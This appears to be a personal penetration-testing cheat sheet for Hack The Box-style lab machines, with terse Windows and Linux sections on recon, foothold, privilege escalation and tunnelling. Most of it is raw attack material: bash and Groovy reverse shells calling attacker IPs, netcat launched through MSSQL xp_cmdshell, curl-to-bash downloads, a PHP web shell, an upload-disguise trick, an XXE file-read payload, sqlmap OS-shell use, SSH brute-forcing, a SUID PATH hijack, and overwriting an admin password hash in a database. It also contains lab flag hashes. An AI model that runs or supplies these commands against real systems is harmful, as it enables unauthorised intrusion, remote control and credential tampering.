```
ssh -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss root@10.129.229.183

```

```
ps rs asp iis
python3 -m http.server 8080
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config
https://github.com/ohpe/juicy-potato/releases/tag/v0.1
https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1

    $client = New-Object System.Net.WebClient
    $url = 'http://10.10.14.60:8000/clsid.ps1'
    $file = 'C:\Users\merlin\Desktop\clsid.ps1'
    $client.DownloadFile($url, $file)
```

```
SAM Files
windows\system32\config\ SAM SYSTEM
samdump2 SYSTEM SAM > fd
```

# Windows

## Recon enumeration

#### SMBClient

```
smbclient -N -L \\\\{TARGET_IP}\\
smbclient -L 10.129.209.18 -U Administrator
smbclient \\\\10.129.209.18\C$ -U Administrator
smbmap -H 10.129.201.119

mask""
recurse ON
prompt OFF
mget *
```

```
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
cat shell.php.png >> mime_shell.php.png
```

## Foothold

## Privilege escalation

```
whoami /priv
icacls job.bat
```

## Services

```
ssh keys
chmod 400 ssh
```

```
curl 'http://10.129.95.192/process.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://10.129.95.192/services.php' -H 'Content-Type: text/xml' -H 'Origin: http://10.129.95.192' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=dtpedleb9pov5beljprnpkan7n' -H 'Sec-GPC: 1' --data-raw '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>'
```


#### Groovy

```
Groovy rs
String host="10.10.14.23";
int port=8001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

https://gtfobins.github.io/

```
└──╼ $feroxbuster -u http://10.129.93.13 -x php,html
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 10.129.93.13
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 10.129.93.13 -x php

nmap -v -sV -p- -oA devops_full 10.10.10.91
searchsploit --nmap -v devops_full.xml
msf auxiliary(scanner/ssh/ssh_enumusers) > run
```


# Linux

## Recon enumeration

```
about:config"
security.tls.version.min
```

```
sudo nmap -sV 10.129.227.248
nmap -sV -sC -p- 10.129.158.230 -oN scan.txt

dirb http://10.129.92.107 -w /usr/share/wordlists/dirb/common.txt
dirb http://10.129.92.107/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -X .sh,.pl,.php

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.129.93.13
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.158.230 -x php
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 10.129.158.230
```

/cgi-bin => shellshock

## Foothold

## Privilege escalation

### pe enumeration

```
id
sudo -l
ss -tln // skip service names
ss -tl 
ss -tlpn

Util:
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts

3 -m http.server 8000

```


## Services

#### lxc

```
sudo apt install snapd
sudo snap install distrobuilder --classic
```

```

#Impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo 3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt

cd impacket/examples/
3 mssqlclient.py -h

SELECT is_srvrolemember('sysadmin');

EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.78/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.78 443"
[xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
10.10.14.9 443"
wget http://10.10.14.78:8000/winPEASx64.exe -outfile winPEASx64.exe
https://github.com/int0x33/nc.exe/blob/master/nc64.exe

```

```
FTP:
ftp anonymous@10.129.241.156
anonymous:anonymous

Postgresql:
psql -U christine -h localhost -p 1234
\l \list 
\c \connect ${database}
\dt ##relations
SELECT * FROM flag;

Bruteforce:
hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh

```


```
Cloud:
AWS:
apt install awscli
aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
aws --endpoint=http://s3.thetoppers.htb s3 cp shell. s3://thetoppers.htb
```


#Reverse shell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
http://thetoppers.htb/shell.php?cmd=id

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.116/4444 0>&1

nc -nvlp 1337

http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.23:8000/rs.sh|bash
3 -m http.server 8000
3 -c 'import pty;pty.spawn("/bin/bash")'

#tunneling 
local port forwarding
ssh -L 1234:localhost:5432 christine@{target_IP}

dynamic port forwarding
/etc/proxychains4.conf
ssh -D 1234 christine@{target_IP}
1. Ensure that strict_chain is not commented out; ( dynamic_chain and random_chain should be
commented out)
2. At the very bottom of the file, under [ProxyList] , we specify the socks5 (or socks4 ) host and port
that we used for our tunnel
<SNIP>
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 9050
socks5 127.0.0.1 1234
proxychains psql -U christine -h localhost -p 5432

#Reverse php
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

#tftp
The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default
root directory where files will be stored is /var/lib/tftpboot

curl 'http://{target_IP}/?file=/var/lib/tftpboot/php-reverse-shell.php'


https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

Privilege escalation:
Linux
sudo -l <- try to obtain root
id <- check permissions, additional groups
find / -group bugtracker 2>/dev/null
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

Commonly noted as SUID (Set owner User ID), the special permission for the user access
level has a single function: A file with SUID always executes as the user who owns the
file, regardless of the user passing the command. If the file owner doesn't have
execute permissions, then use an uppercase S here.
In our case, the binary 'bugtracker' is owned by root & we can execute it as root since
it has SUID set.

/tmp

/bin/sh
chmod +x cat
export PATH=/tmp:$PATH
echo "/bin/sh" > cat

//UNIFI MONGODB
ps aux | grep mongo
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

crete password
mkpasswd -m sha-512 Password1234
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$pgNniKC2xeXtTtRl$KqIpqj6FI8DGb9dXgc7vUCAeGuCWI3rCzKsopTZU5ncfE1F6XjEf.Faq/AecBR7x/ToDPw7bYrVth3kU3WkzS0"}})'

python3 -m http.server 8000

Foothold:
PHP
~~reverse shells
https://github.com/BlackArch/webshells
/usr/share/webshells/
upload file & look for uploads directory
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data user: 
lookup for a files and try to login as user
/var/www/html/...

cat /etc/passwd <- check users on server
su USER <- relogin

script /dev/null -c bash //spawn shell

ec9b13ca4d6229cd5cc1e09980965bf7
dd6e058e814260bc70e9bbdef2715849
Foothold:
SQL
sqlmap -u 'http://10.129.241.156/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
bash -c "bash -i >& /dev/tcp/10.10.14.116/1234 0>&1"
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
/var/www/data checkout
 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf


